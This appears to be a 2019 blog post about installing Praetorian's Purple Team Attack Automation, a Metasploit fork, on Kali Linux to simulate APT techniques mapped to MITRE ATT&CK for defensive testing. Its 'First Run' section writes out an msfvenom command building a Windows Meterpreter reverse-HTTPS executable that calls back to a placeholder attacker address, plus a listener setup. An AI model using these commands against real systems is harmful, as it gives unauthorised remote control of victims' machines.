+++
banner = "/uploads/2019/04/msfconsole.png"
categories = [ "Linux", "Configuration" ]
date = "2019-04-29T20:30:00+00:00"
excerpt = "How to simulate Advanced Persistent Threats (APT) using Metasploit and MITRE's ATT&CK framework..."
format = "post"
tags = [ "Red Team", "Metasploit", "ATT&CK" ]
title = "Simulating APTs For Fun"

+++

In the post I will explain how one could simulate an Advanced Persistent Threat (APT) using Praetorian's Purple Team Attack Automation and MITRE's ATT&CK framework.

<!--more-->

{{< youtube class="ratio ratio-16x9 mb-3" id="REMVMfoeJWE" >}}

### Introduction

How does one go about validating that what has been setup to protect one's infrastructure is actually useful? Well, one will need to be able to simulate threats. To do that, one needs two things, an environment and tools. In the past few days I have been investigating tools that would allow me to simulate Tactics, Techniques and Procedures (TTPs) of better known APTs to validate some concepts we have been exploring at work.

An obvious choice was MITRE's CALDERA, ended up disappointed with it, but pleasantly surprised by Praetorian's [Purple Team Attack Automation][1] (shoutout to [@Decalage2][5] for pointing me to it). As per Purple Team Attack Automation (PTAA) documentation, one should make use of Docker to install it, something that I'm not very keen on doing.

I decided to manually install it, in a nutshell, PTAA is Metasploit with extra modules added to it so how hard could it be? That's also the reason why I liked PTAA so much: the fact that it leverages existing and well maintained software that I use on my workflow.

{{< alert >}}Note that the installation of PTAA was performed in a fresh and fully updated Kali Linux 2019.1a.{{< /alert >}}

### First Things First

First thing is to install the dependencies needed to build the Ruby gems required by Metasploit.

```shell {linenos=inline}
#!/bin/bash
apt-get install -y libssl-dev libreadline-dev zlib1g-dev libpq-dev libsqlite3-dev libpcap-dev
```

Then, clone the source code of [rbenv][2], [ruby-build][3] and of PTAA itself. We'll make use of rbenv as the Metasploit version from which PTAA is based upon, has different requirements from the Metasploit that comes with Kali (e.g., Ruby version). Creating a separate environment makes things easier to manage and avoids problems with version conflicts and the likes.

```shell {linenos=inline}
#!/bin/bash
git clone https://github.com/praetorian-code/purple-team-attack-automation.git ~/purple-team-attack-automation
# Cloning into '/home/researcher/purple-team-attack-automation'...
# remote: Enumerating objects: 480023, done.
# remote: Counting objects: 100% (480023/480023), done.
# remote: Compressing objects: 100% (115968/115968), done.
# remote: Total 480023 (delta 351889), reused 479916 (delta 351795), pack-reused 0
# Receiving objects: 100% (480023/480023), 385.07 MiB | 6.04 MiB/s, done.
# Resolving deltas: 100% (351889/351889), done.
# Checking out files: 100% (10339/10339), done.

git clone https://github.com/rbenv/rbenv.git ~/.rbenv
# Cloning into '/home/researcher/.rbenv'...
# remote: Enumerating objects: 15, done.
# remote: Counting objects: 100% (15/15), done.
# remote: Compressing objects: 100% (13/13), done.
# remote: Total 2759 (delta 4), reused 6 (delta 2), pack-reused 2744
# Receiving objects: 100% (2759/2759), 528.92 KiB | 1.37 MiB/s, done.
# Resolving deltas: 100% (1724/1724), done.

git clone https://github.com/rbenv/ruby-build.git ~/.rbenv/plugins/ruby-build
# Cloning into '/home/researcher/.rbenv/plugins/ruby-build'...
# remote: Enumerating objects: 30, done.
# remote: Counting objects: 100% (30/30), done.
# remote: Compressing objects: 100% (19/19), done.
# remote: Total 9742 (delta 10), reused 24 (delta 7), pack-reused 9712
# Receiving objects: 100% (9742/9742), 2.08 MiB | 3.27 MiB/s, done.
# Resolving deltas: 100% (6336/6336), done.
```

### Ruby, Ruby Gems and a Database

After the code has been downloaded, we need to create a file that can be used to setup the environment every time we want to make use of PTAA. The rbenv documentation instructs one to use the `.bashrc` file. This works well when you have a dedicated user to run the software you're installing, which is not the case. As such, I prefer to use a specific file that I use only when needed.

{{< alert class="warning" >}}Note that the environment file adds `/usr/lib/postgresql/11/bin` to the `PATH` variable as Metasploit `msfdb` utility makes use of `pg_ctl`.{{< /alert >}}

```shell {linenos=inline}
#!/bin/bash
echo '#!/bin/bash' > ~/purple-team-attack-automation/.envinit
echo 'export PATH="$HOME/.rbenv/bin:$PATH"' >> ~/purple-team-attack-automation/.envinit
echo 'export PATH="$HOME/purple-team-attack-automation/:$PATH"' >> ~/purple-team-attack-automation/.envinit
echo 'export PATH="$PATH:/usr/lib/postgresql/11/bin"' >> ~/purple-team-attack-automation/.envinit
echo 'export PS1="(purple-team-attack-automation) $PS1"' >> ~/purple-team-attack-automation/.envinit
echo 'eval "$(rbenv init -)"' >> ~/purple-team-attack-automation/.envinit
```

Now we have everything ready to install Ruby and the gems needed by Metasploit.

```shell {linenos=inline}
#!/bin/bash
. ~/purple-team-attack-automation/.envinit
cd ~/purple-team-attack-automation

rbenv install
# Downloading ruby-2.6.2.tar.bz2...
# -> https://cache.ruby-lang.org/pub/ruby/2.6/ruby-2.6.2.tar.bz2
# Installing ruby-2.6.2...
# Installed ruby-2.6.2 to /home/researcher/.rbenv/versions/2.6.2
```

Verify that the environment is properly setup and correct any errors reported.

```shell {linenos=inline}
#!/bin/bash
curl -fsSL https://github.com/rbenv/rbenv-installer/raw/master/bin/rbenv-doctor | bash
# Checking for `rbenv' in PATH: /home/researcher/.rbenv/bin/rbenv
# Checking for rbenv shims in PATH: OK
# Checking `rbenv install' support: /home/researcher/.rbenv/plugins/ruby-build/bin/rbenv-install (ruby-build 20190423)
# Counting installed Ruby versions: 1 versions
# Checking RubyGems settings: OK
# Auditing installed plugins: OK
```

Finally install the Ruby gems needed by Metasploit using [bundler][4] and setup the database.

{{< alert class="danger" >}}You'll probably want to skip the database initialization command if you already make use of Metasploit's database since you may end up deleting all the loot you have acquired and stored in the already existing database.{{< /alert >}}

{{< alert >}}Make sure the user you are using to execute the `msfdb` utility is in the `postgres` group, otherwise it will fail.{{< /alert >}}

```shell {linenos=inline}
#!/bin/bash
gem install bundler
# Fetching bundler-2.0.1.gem
# Successfully installed bundler-2.0.1
# Parsing documentation for bundler-2.0.1
# Installing ri documentation for bundler-2.0.1
# Done installing documentation for bundler after 2 seconds
# 1 gem installed

bundler install
# Warning: the running version of Bundler (1.17.2) is older than the version that created the lockfile (1.17.3). We suggest you upgrade to the latest version of Bundler by running `gem install bundler`.
# Fetching gem metadata from https://rubygems.org/..............
# Using rake 12.3.2
# Fetching Ascii85 1.0.3
# Installing Ascii85 1.0.3
# Fetching concurrent-ruby 1.0.5
# Installing concurrent-ruby 1.0.5
# Fetching i18n 0.9.5
# Installing i18n 0.9.5
# Using minitest 5.11.3
# ...

id
# uid=1000(researcher) gid=1000(researcher) groups=1000(researcher),27(sudo),117(postgres)

msfdb init --component database
# Creating database at /home/researcher/.msf4/db
# Starting database at /home/researcher/.msf4/db...success
# Creating database users
# Writing client authentication configuration file /home/researcher/.msf4/db/pg_hba.conf
# Stopping database at /home/researcher/.msf4/db
# Starting database at /home/researcher/.msf4/db...success
# Creating initial database schema
```

### First Run

Now that the environment and PTAA are ready, the next step is to generate the payload that will be used to "infect" a target machine.

{{< alert class="warning" >}}Note that the payload generation options below are just for testing. You won't be fooling anyone ;){{< /alert >}}

```shell {linenos=inline}
#!/bin/bash
msfvenom -p windows/x64/meterpreter_reverse_https -a x64 --platform windows LHOST=<attacker IP address> LPORT=8443 -f exe > meterpreter.exe
# No encoder or badchars specified, outputting raw payload
# Payload size: 207449 bytes
# Final size of exe file: 214016 bytes
```

Then we can run Metasploit and start a handler to receive the connections from our Meterpreter payload.

```shell {linenos=inline}
#!/bin/bash
. ~/purple-team-attack-automation/.activate

msfdb start --component database

msfconsole
msf5 > use exploit/multi/handler

msf5 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_https
# PAYLOAD => windows/meterpreter/reverse_tcp

msf5 exploit(multi/handler) > set LHOST <attacker IP ahaddress>
# LHOST => <attacker IP address>

msf5 exploit(multi/handler) > set LPORT 8443
# LPORT => 8443

msf5 exploit(multi/handler)> exploit -j -z
# [*] Exploit running as background job 0.
# [*] Exploit completed, but no session was created.
# [*] Started reverse TCP handler on 192.168.23.205:8443
```

### Running the Simulation

Now that we have everything ready, we need to select what PTAA modules we need to run. Since PTAA makes usage of MITRE's ATT&CK framework we can for each of the defined tactics, select the techniques specific to the APT one wants to simulate and that PTAA supports. For example, if we want to simulate APT28 (because, from Mother Russia with love) on the "Execution" tactic we can select technique T1086 - execution with PowerShell.

Hope this is helpful :D

[1]: https://github.com/praetorian-code/purple-team-attack-automation/ "Purple Team Attack Automation Repository"
[2]: https://github.com/rbenv "rbenv Repository"
[3]: https://github.com/rbenv/ruby-build "ruby-build Respository"
[4]: https://bundler.io/ "Ruby Bundler Site"
[5]: https://twitter.com/decalage2 "Decalage Twitter"
